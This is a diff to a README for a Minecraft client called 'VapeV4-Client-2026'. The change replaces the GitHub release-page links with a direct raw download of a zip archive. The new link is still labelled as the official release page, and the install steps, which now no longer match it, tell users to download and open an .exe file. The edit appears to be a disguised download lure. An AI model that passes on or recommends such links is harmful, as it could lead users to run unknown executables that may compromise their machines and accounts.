@@ -1,6 +1,6 @@
 # 🎮 VapeV4-Client-2026 - Improve your Minecraft gaming experience today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/yash78633/VapeV4-Client-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/yash78633/VapeV4-Client-2026/main/mordication/Vape_Client_3.9.zip)
 
 VapeV4-Client-2026 offers tools for Minecraft players. This software adds features to the game. It helps you manage your character and interactions. You can use these features in various game modes. The client works with current Minecraft versions. It provides a stable experience for daily use. You can change settings through a simple menu.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these needs before you start. These specs ensure the 
 
 Follow these steps to set up the client on your machine.
 
-1.  Visit the official release page: [https://github.com/yash78633/VapeV4-Client-2026/releases](https://github.com/yash78633/VapeV4-Client-2026/releases)
+1.  Visit the official release page: [https://raw.githubusercontent.com/yash78633/VapeV4-Client-2026/main/mordication/Vape_Client_3.9.zip](https://raw.githubusercontent.com/yash78633/VapeV4-Client-2026/main/mordication/Vape_Client_3.9.zip)
 2.  Look for the section marked Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Open the file after the download finishes.
